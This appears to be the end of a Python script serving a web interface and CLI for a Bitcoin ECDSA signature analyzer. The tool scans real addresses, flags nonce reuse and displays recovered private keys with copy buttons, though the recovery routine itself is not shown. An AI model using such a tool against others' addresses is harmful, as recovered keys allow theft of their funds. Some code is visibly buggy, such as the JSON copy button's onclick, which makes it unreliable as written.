  .toggle-group button.active { background:var(--accent); color:#000; }
  .val { font-family:monospace; font-size:.7rem; word-break:break-all; max-width:200px; display:block; }
  .badge { display:inline-block; padding:.15rem .5rem; border-radius:4px; font-size:.65rem; font-weight:600; }
  .badge-yes { background:rgba(16,185,129,.15); color:var(--emerald); }
  .badge-no { background:rgba(249,115,22,.15); color:var(--orange); }
  .badge-critical { background:rgba(239,68,68,.15); color:var(--red); }
  .badge-medium { background:rgba(249,115,22,.15); color:var(--orange); }
  .badge-low { background:rgba(113,113,122,.15); color:var(--muted); }
  .vuln-card { background:var(--card); border:1px solid var(--border); border-radius:.75rem; padding:1.5rem; margin-bottom:1rem; }
  .vuln-card.critical { border-left:4px solid var(--red); }
  .vuln-card.medium { border-left:4px solid var(--orange); }
  .vuln-card.low { border-left:4px solid var(--muted); }
  .vuln-card h3 { font-size:1rem; margin-bottom:.5rem; }
  .vuln-card .desc { font-size:.8rem; color:var(--muted); margin-bottom:1rem; word-break:break-word; }
  .key-panel { background:rgba(16,185,129,.05); border:1px solid rgba(16,185,129,.3); border-radius:.5rem; padding:1rem; margin:1rem 0; }
  .key-panel .label { font-size:.75rem; color:var(--emerald); margin-bottom:.25rem; font-weight:600; }
  .key-panel .val { font-family:monospace; font-size:.8rem; word-break:break-all; max-width:none; }
  .key-panel .warn { font-size:.75rem; color:var(--red); margin-top:.5rem; }
  .copy-btn { background:transparent; border:1px solid var(--border); color:var(--muted); font-size:.65rem; padding:.2rem .5rem; border-radius:4px; cursor:pointer; }
  .copy-btn:hover { color:var(--fg); }
  .empty { text-align:center; padding:3rem; color:var(--muted); }
  .alert { padding:1rem; border-radius:.5rem; margin-bottom:1rem; font-size:.85rem; }
  .alert-error { background:rgba(239,68,68,.1); border:1px solid rgba(239,68,68,.3); color:var(--red); }
  .alert-info { background:rgba(247,147,26,.1); border:1px solid rgba(247,147,26,.3); color:var(--orange); }
  .toolbar { display:flex; gap:.75rem; align-items:center; margin-bottom:1rem; flex-wrap:wrap; }
  .toolbar input, .toolbar select { background:#0d0d0d; border:1px solid var(--border); border-radius:.5rem; padding:.4rem .6rem; color:var(--fg); font-size:.75rem; }
  footer { margin-top:auto; border-top:1px solid var(--border); padding:1rem 1.5rem; font-size:.75rem; color:var(--muted); display:flex; justify-content:space-between; }
  .hidden { display:none; }
  ::-webkit-scrollbar { width:8px; height:8px; }
  ::-webkit-scrollbar-track { background:transparent; }
  ::-webkit-scrollbar-thumb { background:var(--border); border-radius:4px; }
  ::-webkit-scrollbar-thumb:hover { background:var(--muted); }
</style>
</head>
<body>
<header>
  <h1><span class="icon">🔑</span> Bitcoin ECDSA Signature Analyzer</h1>
  <div class="sub">Automated pipeline: fetch spending txs → parse r/s/z → detect nonce-reuse &amp; private-key recovery</div>
</header>

<main>
  <div class="grid">
    <div class="card">
      <h2>Control Panel</h2>
      <p style="font-size:.8rem;color:var(--muted);margin-bottom:.75rem;">Enter Bitcoin addresses (one per line, or comma/space separated).</p>
      <textarea id="addresses" placeholder="1FvUkW8thcqG6HP7gAvAjcR52fR7CYodBx&#10;12ib7dApVFvg82TXKycWBNpN8kFyiAN1dr">1FvUkW8thcqG6HP7gAvAjcR52fR7CYodBx</textarea>
      <div class="controls">
        <button class="btn-ghost" onclick="loadSample()">Load samples</button>
        <button class="btn-ghost" onclick="clearAll()">Clear</button>
      </div>
      <div class="controls">
        <button class="btn-run" id="runBtn" onclick="runPipeline()">▶ Run Pipeline</button>
      </div>
      <div class="progress hidden" id="progressBox">
        <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:0%"></div></div>
        <div class="progress-text" id="progressText"></div>
      </div>
    </div>

    <div class="card">
      <h2>Live Activity Log</h2>
      <div class="log" id="logBox"></div>
    </div>
  </div>

  <div id="alertBox"></div>

  <div class="stats hidden" id="statsRow"></div>

  <div class="card hidden" id="resultsCard">
    <div class="tabs">
      <button class="tab active" onclick="switchTab('sigs')">Signatures <span class="badge" id="sigCount">0</span></button>
      <button class="tab" onclick="switchTab('vulns')">Vulnerabilities <span class="badge" id="vulnCount">0</span></button>
      <button class="tab" onclick="switchTab('raw')">Raw JSON</button>
    </div>

    <div id="tab-sigs">
      <div class="toolbar">
        <div class="toggle-group">
          <button class="active" onclick="setBase('hex',this)">Hex</button>
          <button onclick="setBase('dec',this)">Decimal</button>
          <button onclick="setBase('bin',this)">Binary</button>
        </div>
        <input type="text" id="search" placeholder="Search address / txid…" oninput="renderSigs()">
        <button class="btn-ghost" onclick="exportCsv()">Export CSV</button>
        <button class="btn-ghost" onclick="exportJson()">Export JSON</button>
      </div>
      <div class="table-wrap" id="sigsTable"></div>
    </div>

    <div id="tab-vulns" class="hidden"></div>
    <div id="tab-raw" class="hidden"></div>
  </div>
</main>

<footer>
  <span>Bitcoin ECDSA Signature Analyzer — educational / security-research use only.</span>
  <span id="status">Ready</span>
</footer>

<script>
let signatures = [], vulnerabilities = [], summary = {};
let currentBase = 'hex';
let currentTab = 'sigs';

function log(msg, phase) {
  const box = document.getElementById('logBox');
  const ts = new Date().toLocaleTimeString('en-US', {hour12:false}) + '.' + String(Date.now()%1000).padStart(3,'0');
  const entry = document.createElement('div');
  entry.className = 'log-entry';
  entry.innerHTML = '<span class="ts">'+ts+'</span> ' + (phase?'<span class="phase">'+phase+'</span> ':'') + msg;
  box.appendChild(entry);
  box.scrollTop = box.scrollHeight;
}

async function runPipeline() {
  const text = document.getElementById('addresses').value;
  const resp = await fetch('/api/scan', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({addresses:text})
  });
  if (!resp.ok) {
    const err = await resp.text();
    document.getElementById('alertBox').innerHTML = '<div class="alert alert-error">Error: '+err+'</div>';
    return;
  }
  // Read streaming response (one JSON per line)
  const reader = resp.body.getReader();
  const decoder = new TextDecoder();
  let buffer = '';
  document.getElementById('runBtn').disabled = true;
  document.getElementById('runBtn').textContent = 'Running…';
  document.getElementById('progressBox').classList.remove('hidden');
  document.getElementById('logBox').innerHTML = '';

  while (true) {
    const {done, value} = await reader.read();
    if (done) break;
    buffer += decoder.decode(value, {stream:true});
    const lines = buffer.split('\n');
    buffer = lines.pop();
    for (const line of lines) {
      if (!line.trim()) continue;
      try {
        const evt = JSON.parse(line);
        handleEvent(evt);
      } catch(e) {}
    }
  }
  if (buffer.trim()) { try { handleEvent(JSON.parse(buffer)); } catch(e) {} }
  document.getElementById('runBtn').disabled = false;
  document.getElementById('runBtn').textContent = '▶ Run Pipeline';
  document.getElementById('status').textContent = 'Complete';
}

function handleEvent(evt) {
  if (evt.type === 'progress') {
    log(evt.message, evt.phase);
    document.getElementById('progressText').textContent = evt.message;
    if (evt.total > 0) {
      const pct = Math.round((evt.current / evt.total) * 100);
      document.getElementById('progressFill').style.width = pct + '%';
    }
  } else if (evt.type === 'complete') {
    signatures = evt.signatures || [];
    vulnerabilities = evt.vulnerabilities || [];
    summary = evt.summary || {};
    renderStats();
    renderSigs();
    renderVulns();
    renderRaw();
    document.getElementById('statsRow').classList.remove('hidden');
    document.getElementById('resultsCard').classList.remove('hidden');
    document.getElementById('progressFill').style.width = '100%';
  } else if (evt.type === 'error') {
    document.getElementById('alertBox').innerHTML = '<div class="alert alert-error">'+evt.error+'</div>';
  }
}

function renderStats() {
  const s = summary;
  const items = [
    {num:s.addresses||0, lbl:'Addresses'},
    {num:s.signatures||0, lbl:'Signatures'},
    {num:s.vulnerabilities||0, lbl:'Vulnerabilities'},
    {num:s.nonce_reuse_count||0, lbl:'Nonce Reuse', cls:'critical'},
    {num:s.high_s_count||0, lbl:'High-S'},
    {num:s.keys_recovered||0, lbl:'Keys Recovered', cls:'recovered'},
  ];
  document.getElementById('statsRow').innerHTML = items.map(i =>
    '<div class="stat '+(i.cls||'')+'"><div class="num">'+i.num+'</div><div class="lbl">'+i.lbl+'</div></div>'
  ).join('');
  document.getElementById('sigCount').textContent = signatures.length;
  document.getElementById('vulnCount').textContent = vulnerabilities.length;
}

function fmt(hex, base) {
  if (!hex) return '';
  if (base === 'hex') return hex;
  let n = BigInt('0x'+hex.replace(/^0+/,'')||'0');
  if (base === 'dec') return n.toString();
  if (base === 'bin') {
    let bits = n.toString(2); if (n===0n) bits='0';
    let pad = (8 - bits.length%8)%8; bits = '0'.repeat(pad)+bits;
    return bits.match(/.{8}/g).join(' ');
  }
  return hex;
}

function setBase(b, btn) {
  currentBase = b;
  document.querySelectorAll('.toggle-group button').forEach(x=>x.classList.remove('active'));
  btn.classList.add('active');
  renderSigs();
}

function renderSigs() {
  const search = document.getElementById('search').value.toLowerCase();
  let filtered = signatures;
  if (search) {
    filtered = signatures.filter(s =>
      s.address.toLowerCase().includes(search) || s.txid.toLowerCase().includes(search)
    );
  }
  if (!filtered.length) {
    document.getElementById('sigsTable').innerHTML = '<div class="empty">No signatures</div>';
    return;
  }
  let html = '<table><thead><tr>' +
    ['#','Address','TxID','In','Type','r','s','z','low-S','sighash','Pubkey']
    .map(h=>'<th>'+h+'</th>').join('') + '</tr></thead><tbody>';
  filtered.forEach((s,i) => {
    const lowSBadge = s.low_s ? '<span class="badge badge-yes">yes</span>' : '<span class="badge badge-no">no</span>';
    const rowStyle = s.low_s ? '' : 'style="background:rgba(249,115,22,.04)"';
    html += '<tr '+rowStyle+'>' +
      '<td>'+(i+1)+'</td>' +
      '<td><span class="val">'+s.address+'</span></td>' +
      '<td><span class="val">'+s.txid+'</span></td>' +
      '<td>'+s.input_index+'</td>' +
      '<td><span class="badge badge-low">'+s.type+'</span></td>' +
      '<td><span class="val">'+fmt(s.r, currentBase)+'</span></td>' +
      '<td><span class="val">'+fmt(s.s, currentBase)+'</span></td>' +
      '<td><span class="val">'+fmt(s.z, currentBase)+'</span></td>' +
      '<td>'+lowSBadge+'</td>' +
      '<td>0x'+s.sighash_type.toString(16)+'</td>' +
      '<td><span class="val">'+s.pubkey+'</span></td>' +
      '</tr>';
  });
  html += '</tbody></table>';
  document.getElementById('sigsTable').innerHTML = html;
}

function renderVulns() {
  if (!vulnerabilities.length) {
    document.getElementById('tab-vulns').innerHTML = '<div class="empty">✓ No vulnerabilities detected</div>';
    return;
  }
  let html = '';
  vulnerabilities.forEach(v => {
    html += '<div class="vuln-card '+v.severity+'">' +
      '<div style="display:flex;gap:.5rem;align-items:center;margin-bottom:.5rem">' +
      '<span class="badge badge-'+v.severity+'">'+v.severity.toUpperCase()+'</span>' +
      '<span class="badge badge-low">'+v.type.replace('_',' ')+'</span>' +
      '<h3>'+v.title+'</h3></div>' +
      '<div class="desc">'+v.description+'</div>';
    if (v.recovered_private_key) {
      html += '<div class="key-panel">' +
        '<div class="label">⚠ RECOVERED PRIVATE KEY (controls all funds for this address)</div>' +
        '<div class="val mono">'+v.recovered_private_key+'</div>' +
        '<button class="copy-btn" onclick="copy(\''+v.recovered_private_key+'\')">Copy key</button>' +
        '<div class="label" style="margin-top:.75rem">Recovered nonce k</div>' +
        '<div class="val mono">'+v.recovered_nonce+'</div>' +
        '<button class="copy-btn" onclick="copy(\''+v.recovered_nonce+'\')">Copy nonce</button>' +
        '<div class="warn">Anyone with this private key can sign transactions spending all funds locked by the corresponding public key.</div>' +
        '</div>';
    }
    if (v.signatures && v.signatures.length) {
      html += '<details><summary style="cursor:pointer;font-size:.8rem;color:var(--muted)">'+v.signatures.length+' involved signature(s)</summary>';
      v.signatures.forEach(s => {
        html += '<div style="font-family:monospace;font-size:.7rem;padding:.5rem;border-bottom:1px solid var(--border);word-break:break-all">' +
          s.txid + ' input ' + s.input_index + ' — r=' + s.r + ' s=' + s.s + ' z=' + s.z + '</div>';
      });
      html += '</details>';
    }
    html += '</div>';
  });
  document.getElementById('tab-vulns').innerHTML = html;
}

function renderRaw() {
  const data = JSON.stringify({signatures, vulnerabilities, summary}, null, 2);
  document.getElementById('tab-raw').innerHTML =
    '<button class="copy-btn" onclick="copy(\''+btoa(data).replace(/'/g,"\\'")+'\'.length>0?JSON.stringify({signatures,vulnerabilities,summary},null,2):'')" style="margin-bottom:1rem">Copy JSON</button>' +
    '<pre class="mono" style="font-size:.7rem;white-space:pre-wrap;word-break:break-all;max-height:600px;overflow:auto;background:#0d0d0d;padding:1rem;border-radius:.5rem;border:1px solid var(--border)">'+data+'</pre>';
}

function switchTab(tab) {
  currentTab = tab;
  document.querySelectorAll('.tab').forEach((t,i) => t.classList.remove('active'));
  ['sigs','vulns','raw'].forEach((t,i) => {
    if (t === tab) document.querySelectorAll('.tab')[i].classList.add('active');
  });
  ['sigs','vulns','raw'].forEach(t => {
    document.getElementById('tab-'+t).classList.toggle('hidden', t !== tab);
  });
}

function copy(text) {
  navigator.clipboard.writeText(text).then(()=>{});
}

function exportCsv() {
  let csv = 'address,txid,input_index,type,r,s,z,low_s,sighash_type,pubkey,der_signature\n';
  signatures.forEach(s => {
    const row = [s.address,s.txid,s.input_index,s.type,
      fmt(s.r,currentBase),fmt(s.s,currentBase),fmt(s.z,currentBase),
      s.low_s,s.sighash_type,s.pubkey,s.der_signature];
    csv += row.map(c => {
      let v = String(c); if (v.includes(',')) v = '"'+v.replace(/"/g,'""')+'"'; return v;
    }).join(',') + '\n';
  });
  download('signatures_'+currentBase+'.csv', csv);
}

function exportJson() {
  download('results.json', JSON.stringify({signatures,vulnerabilities,summary},null,2));
}

function download(name, content) {
  const blob = new Blob([content], {type:'text/plain'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob); a.download = name; a.click();
  URL.revokeObjectURL(a.href);
}

function loadSample() {
  document.getElementById('addresses').value =
    '1FvUkW8thcqG6HP7gAvAjcR52fR7CYodBx\n12ib7dApVFvg82TXKycWBNpN8kFyiAN1dr\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
}

function clearAll() {
  signatures = []; vulnerabilities = []; summary = {};
  document.getElementById('statsRow').classList.add('hidden');
  document.getElementById('resultsCard').classList.add('hidden');
  document.getElementById('logBox').innerHTML = '';
  document.getElementById('alertBox').innerHTML = '';
  document.getElementById('progressBox').classList.add('hidden');
  document.getElementById('status').textContent = 'Ready';
}

log('Ready. Click "Run Pipeline" to start.');
</script>
</body>
</html>
"""

# =============================================================================
#  HTTP server
# =============================================================================
class PipelineHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # suppress default request logging

    def do_GET(self):
        if self.path == '/' or self.path.startswith('/?'):
            self._send_html(HTML_UI)
        else:
            self._send_json(404, {'error': 'Not found'})

    def do_POST(self):
        if self.path == '/api/scan':
            self._handle_scan()
        else:
            self._send_json(404, {'error': 'Not found'})

    def _send_html(self, html: str):
        data = html.encode('utf-8')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _send_json(self, code: int, obj):
        data = json.dumps(obj).encode('utf-8')
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _handle_scan(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8') if length else ''
        try:
            payload = json.loads(body)
            text = payload.get('addresses', '')
        except Exception:
            self._send_json(400, {'error': 'Invalid JSON body'})
            return

        addresses = parse_addresses(text)
        if not addresses:
            self._send_json(400, {'error': 'No valid Bitcoin addresses provided'})
            return
        if len(addresses) > 20:
            self._send_json(400, {'error': 'Too many addresses (max 20)'})

        # Stream results as newline-delimited JSON (NDJSON)
        self.send_response(200)
        self.send_header('Content-Type', 'application/x-ndjson')
        self.send_header('Cache-Control', 'no-cache')
        self.end_headers()

        def emit(obj):
            try:
                self.wfile.write((json.dumps(obj) + '\n').encode('utf-8'))
                self.wfile.flush()
            except Exception:
                pass

        try:
            def on_progress(msg, current=None, total=None):
                emit({
                    'type': 'progress',
                    'phase': 'fetching',
                    'message': msg,
                    'current': current or 0,
                    'total': total or 0,
                })

            result = run_pipeline(addresses, on_progress=on_progress)
            emit({'type': 'complete', **result})
        except Exception as e:
            emit({'type': 'error', 'error': str(e)})

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

# =============================================================================
#  CLI mode
# =============================================================================
def cli_mode(addresses):
    """Run the pipeline from the command line, print JSON to stdout."""
    def on_progress(msg, current=None, total=None):
        print(f"  {msg}", file=sys.stderr)

    result = run_pipeline(addresses, on_progress=on_progress)
    print(json.dumps(result, indent=2))

# =============================================================================
#  Main entry point
# =============================================================================
def main():
    parser = argparse.ArgumentParser(
        description='Bitcoin ECDSA Signature Analysis Pipeline — standalone web server',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python pipeline_server.py                    # Start web server on port 8000
  python pipeline_server.py --port 9000        # Use a different port
  python pipeline_server.py --cli 1FvUkW8...   # CLI mode: scan address, print JSON
  python pipeline_server.py --cli < addr.txt   # CLI mode: read addresses from stdin

Then open http://localhost:8000 in your browser.
        """)
    parser.add_argument('--port', type=int, default=8000, help='Web server port (default: 8000)')
    parser.add_argument('--cli', nargs='*', default=None,
                        help='CLI mode: scan the given addresses and print JSON to stdout. '
                             'If no addresses given, reads from stdin.')
    args = parser.parse_args()

    if args.cli is not None:
        # CLI mode
        addresses = args.cli
        if not addresses:
            # Read from stdin
            text = sys.stdin.read()
            addresses = parse_addresses(text)
        if not addresses:
            print("No valid addresses provided.", file=sys.stderr)
            sys.exit(1)
        cli_mode(addresses)
    else:
        # Web server mode
        server = ThreadingHTTPServer(('0.0.0.0', args.port), PipelineHandler)
        print(f"{'='*60}")
        print(f"  Bitcoin ECDSA Signature Analysis Pipeline")
        print(f"{'='*60}")
        print(f"  Server running on  http://localhost:{args.port}")
        print(f"  Open it in your browser to start scanning.")
        print(f"  Press Ctrl+C to stop.")
        print(f"{'='*60}")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down…")
            server.shutdown()

if __name__ == '__main__':
    main()
